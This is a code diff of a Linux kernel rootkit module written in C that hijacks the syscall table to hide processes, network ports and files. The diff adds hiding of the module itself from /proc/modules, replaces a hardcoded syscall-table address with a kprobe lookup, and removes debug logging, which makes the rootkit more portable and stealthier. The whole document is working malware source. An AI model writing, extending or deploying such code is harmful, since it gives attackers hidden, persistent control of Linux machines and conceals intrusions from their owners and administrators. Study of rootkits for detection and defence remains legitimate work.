@@ -13,6 +13,7 @@
 #include <linux/prefetch.h>
 #include <linux/fs_struct.h>
 #include <linux/uaccess.h>
+#include <linux/kprobes.h>
 #include "mount.h"
 
 MODULE_LICENSE("GPL");
@@ -22,6 +23,9 @@ MODULE_VERSION("0.1");
 
 #define BASE_PROC 1
 #define NET_PROC 2
+#define MODULES_PROC 3
+
+char * ROOTKIT_NAME = "rootkit";
 
 // https://linux.die.net/man/2/getdents64
 struct linux_dirent {
@@ -93,6 +97,17 @@ asmlinkage long mal_sys_openat(const struct pt_regs * regs)
 
                                 proc_fd_head = ll_element;
                                 return fd;
+                        } else if (!strcmp(full_path, "/proc/modules")) {
+                                long fd = original_sys_openat(regs);
+
+                                struct proc_fd * ll_element = (struct proc_fd *)kmalloc(sizeof(struct proc_fd), GFP_KERNEL);
+                                ll_element->pid = current->pid;
+                                ll_element->fd = fd;
+                                ll_element->type = MODULES_PROC;
+                                ll_element->next = proc_fd_head;
+
+                                proc_fd_head = ll_element;
+                                return fd;
                         }
                 }
 
@@ -122,16 +137,17 @@ asmlinkage long mal_sys_getdents64(const struct pt_regs * regs)
         // check if file is included in getdents64 (ls source, readdir source)
         // first save the linux_dirent pointer
         void * dirent_ptr = regs->si;
-        printk(KERN_INFO "COUNT: %x\n", regs->dx);
 
         int fd = regs->di;
         int pid = current->pid;
         struct proc_fd * tmp = proc_fd_head;
 
         bool is_proc = false;
+		int dir_type = 0;
         while (tmp) {
-                if (tmp->fd == fd && tmp->pid == pid && tmp->type == BASE_PROC) {
+                if (tmp->fd == fd && tmp->pid == pid && (tmp->type == BASE_PROC)) {
                         is_proc = true;
+						dir_type = tmp->type;
                         break;
                 }
                 tmp = tmp->next;
@@ -140,16 +156,12 @@ asmlinkage long mal_sys_getdents64(const struct pt_regs * regs)
         char * path_buff = kmalloc(0x400, GFP_KERNEL);
         kern_getcwd(path_buff, 0x400);
 
-        printk("PATH: %s\n", path_buff);
-
         long size = original_sys_getdents64(regs);
-        printk(KERN_INFO "RET: %lx\n", size);
 
         if (size > 0){
                 char * buffer = kmalloc(size+1, GFP_KERNEL);
                 int copied_bytes = copy_from_user(buffer, dirent_ptr, size);
                 if (copied_bytes > 0) {
-                        printk("UNKNOWN ERROR");
                         return size;
                 }
 
@@ -160,8 +172,6 @@ asmlinkage long mal_sys_getdents64(const struct pt_regs * regs)
                 int clean_off = 0;
                 for (curr_off = 0; curr_off < size; ) {
                         struct linux_dirent * dpt = (struct linux_dirent *)(buffer+curr_off);
-                        printk(KERN_INFO "SIZE: %lx\n", dpt->d_reclen);
-                        printk(KERN_INFO "NAME: %s\n", dpt->d_name);
 
                         // it can be seen in the debug information that d_name starts with a character
                         // 0x04 indicates a directory
@@ -172,12 +182,11 @@ asmlinkage long mal_sys_getdents64(const struct pt_regs * regs)
                                 // each call seeks file stream, so just return next
                                 curr_off += dpt->d_reclen;
                                 continue;
-                        }
+						}
 
                         if (is_proc) {
                                 long file_pid = 0;
                                 kstrtol(dpt->d_name+1, 10, &file_pid);
-                                printk("FILE PID: %lx\n", file_pid);
 
                                 if (file_pid > 0) {
                                         if (pid_map[file_pid]) {
@@ -244,11 +253,14 @@ asmlinkage long mal_sys_fork(const struct pt_regs * regs)
 
 asmlinkage long mal_sys_bind(const struct pt_regs * regs)
 {
-        struct sockaddr * s = kmalloc(regs->dx, GFP_KERNEL);
-        copy_from_user(s, regs->si, regs->dx);
-        short port = ((short *)s->sa_data)[0];
-        port_map[port] = 1;
-        kfree(s);
+		int pid = current->pid;
+		if (pid_map[pid]) {
+				struct sockaddr * s = kmalloc(regs->dx, GFP_KERNEL);
+				copy_from_user(s, regs->si, regs->dx);
+				short port = ((short *)s->sa_data)[0];
+				port_map[port] = 1;
+				kfree(s);
+		}
         return original_sys_bind(regs);
 }
 
@@ -259,9 +271,11 @@ asmlinkage long mal_sys_read(const struct pt_regs * regs)
         struct proc_fd * tmp = proc_fd_head;
 
         bool is_proc = false;
+		int fd_type = 0;
         while (tmp) {
-                if (tmp->fd == fd && tmp->pid == pid && tmp->type == NET_PROC) {
+                if (tmp->fd == fd && tmp->pid == pid && ((tmp->type == NET_PROC) || (tmp->type == MODULES_PROC))) {
                         is_proc = true;
+						fd_type = tmp->type;
                         break;
                 }
                 tmp = tmp->next;
@@ -276,46 +290,47 @@ asmlinkage long mal_sys_read(const struct pt_regs * regs)
                 }
 
                 char * kern_buff = kmalloc(ret+1, GFP_KERNEL);
-                printk("HERE\n");
                 copy_from_user(kern_buff, user_buff, ret);
 
                 char * out_buff = kzalloc(ret+1, GFP_KERNEL);
                 char * line = strsep(&kern_buff, "\n");
 
-                printk("LINE: %s\n", line);
-
                 while (line) {
                         // read through 2 colons
-                        int i;
-                        bool first_found = false;
-                        for (i = 0; i < strlen(line); i++) {
-                                if (line[i] == ':' && first_found) {
-                                        break;
-                                } else if (line[i] == ':') {
-                                        first_found = true;
-                                }
-                        }
+						if (fd_type == NET_PROC) {
+								int i;
+								bool first_found = false;
+								for (i = 0; i < strlen(line); i++) {
+										if (line[i] == ':' && first_found) {
+												break;
+										} else if (line[i] == ':') {
+												first_found = true;
+										}
+								}
 
-                        if (i == strlen(line)) {
-                                strcat(out_buff, line);
-                                strcat(out_buff, "\n");
-                                line = strsep(&kern_buff, "\n");
-                                continue;
-                        }
+								if (i == strlen(line)) {
+										strcat(out_buff, line);
+										strcat(out_buff, "\n");
+										line = strsep(&kern_buff, "\n");
+										continue;
+								}
 
-                        char * hex_port = line+i+1;
-                        hex_port[0x4] = '\0';
-                        long port_num = 0;
-                        kstrtol(hex_port, 0x10, &port_num);
-                        printk("PORT FOUND: %lx\n", port_num);
-                        printk("MATCHING LINE: %s\n", line);
-                        printk("MATCHING PART: %s\n", hex_port);
+								char * hex_port = line+i+1;
+								hex_port[0x4] = '\0';
+								long port_num = 0;
+								kstrtol(hex_port, 0x10, &port_num);
 
-                        if (!port_map[port_num]) {
-                                hex_port[0x4] = ' ';
-                                strcat(out_buff, line);
-                                strcat(out_buff, "\n");
-                        }
+								if (!port_map[port_num]) {
+										hex_port[0x4] = ' ';
+										strcat(out_buff, line);
+										strcat(out_buff, "\n");
+								}
+						} else {
+								if (!strstr(line, "rootkit")) {
+										strcat(out_buff, line);
+										strcat(out_buff, "\n");
+								}
+						}
 
                         line = strsep(&kern_buff, "\n");
                 }
@@ -323,7 +338,7 @@ asmlinkage long mal_sys_read(const struct pt_regs * regs)
                 long newlen = strlen(out_buff);
                 copy_to_user(user_buff, out_buff, ret);
                 return newlen;
-        }
+        } 
 
         return original_sys_read(regs);
 }
@@ -569,33 +584,26 @@ static void patch_syscall(uint64_t index, void * function_ptr)
 }
 
 // lookup alternative for kallsyms_lookup_name
+// https://infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking-8f1bc0bd099c
 static void ** syscall_table_lookup(void)
 {
-        unsigned long i;
-        for (i = (unsigned long)ksys_close; i < 0xffffffffffffffff; i += sizeof(void *)) {
-                void ** syscall_table = (void **)i;
-                if (syscall_table[__NR_ptrace] == ksys_close) {
-                        return syscall_table;
-                }
-        }
+        struct kprobe k = {
+                .symbol_name = "sys_call_table"
+        };
 
-        return NULL;
+        register_kprobe(&k);
+
+        return (void **)(k.addr);
 }
 
 static int __init rootkit_init(void)
 {
-                printk(KERN_INFO "Initializing...\n");
-
                 pid_map = (char *)kmalloc(sizeof(char) * 32768, GFP_KERNEL);
                 //pid_map[41548] = 1;
                 port_map = (char *)kmalloc(sizeof(char) * 65537, GFP_KERNEL);
                 port_map[1337] = 1;
 
-                //syscall_table = (uint64_t *)kallsyms_lookup_name("sys_call_table");
-                //syscall_table = syscall_table_lookup();
-                // manually patch for now
-                syscall_table = (void *)0xffffffffa8e002c0;
-                printk(KERN_INFO "SYSCALL TABLE @ %llx\n", (uint64_t)syscall_table);
+                syscall_table = syscall_table_lookup();
 
                 original_sys_open = syscall_table[__NR_open];
                 original_sys_openat = syscall_table[__NR_openat];
@@ -605,10 +613,6 @@ static int __init rootkit_init(void)
                 original_sys_fork = syscall_table[__NR_fork];
                 original_sys_bind = syscall_table[__NR_bind];
                 original_sys_read = syscall_table[__NR_read];
-
-                printk(KERN_INFO "sys_open @ %llx\n", (uint64_t)original_sys_open);
-                printk(KERN_INFO "sys_openat @ %llx\n", (uint64_t)original_sys_openat);
-                printk(KERN_INFO "sys_getdents64 @ %llx\n", (uint64_t)original_sys_getdents64);
 
                 patch_syscall(__NR_open, mal_sys_open);
                 patch_syscall(__NR_openat, mal_sys_openat);
@@ -636,10 +640,8 @@ static void __exit rootkit_exit(void)
                 patch_syscall(__NR_execve, original_sys_execve);
                 patch_syscall(__NR_bind, original_sys_bind);
                 patch_syscall(__NR_read, original_sys_read);
-                printk(KERN_INFO "Exiting...\n");
                 return;
 }
 
 module_init(rootkit_init);
 module_exit(rootkit_exit);
-
